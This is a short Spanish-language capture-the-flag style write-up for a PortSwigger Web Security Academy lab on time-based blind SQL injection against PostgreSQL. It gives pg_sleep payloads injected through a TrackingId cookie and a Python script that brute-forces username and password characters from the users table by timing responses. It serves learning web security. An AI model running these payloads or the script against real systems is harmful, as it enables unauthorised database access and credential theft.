---
title: "15 - Blind SQL injection with time delays and information retrieval"
---

# 15 - Blind SQL injection with time delays and information retrieval

Postgres detectado
```r
TrackingId='%3b+SELECT+pg_sleep(5)+--+-
```

```R
TrackingId='%3b+SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+-
```

Para extraer la primera letra de la tupla (username:password) de la primera fila de la tabla users : 
```r
TrackingId='%3b+SELECT+CASE+WHEN+(SELECT+SUBSTRING((username||':'||password),1,1)+FROM+users+LIMIT+1+OFFSET+0)='a'+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+-
```

Modificamos un poco el script : 

```python

#!/usr/bin/env python3

from asyncio import log
import string
from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

proxies = {
    "http": "http://127.0.0.1:8080"
}

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + ':'
url= "https://0a66001a03871f8080dcfd6d00a70015.web-security-academy.net/product?productId=4"

def makeSQLI():
	s=requests.session()
	s.verify = False

	p1= log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2= log.progress("Contenido")

	resultado= ""
	
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	for offset in range(0,5):
		found=True
		position=1
		while found :
			found=False
			for character in characters:
				payload=f"'%3b+SELECT+CASE+WHEN+(SELECT+SUBSTRING((username||':'||password),{position},1)+FROM+users+LIMIT+1+OFFSET+{offset})='{character}'+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+--+-"
				cookies = {
					"TrackingId": f"{payload}",
					"session": "I5DWDF9YEA5TdRe9OAa9wnzttWZfDzvw"
				}
				p1.status(payload)
				#url = quote(url, safe=':/?&=.,')

				time_start = time.time()
				r = s.get(url,cookies=cookies,verify=False,proxies=proxies)
				time_end= time.time()

				if time_end -time_start > 5:
					resultado += character
					p2.status(resultado)
					position+=1
					found=True
					break
		resultado+='\n'


if __name__ == '__main__':
	makeSQLI()

```
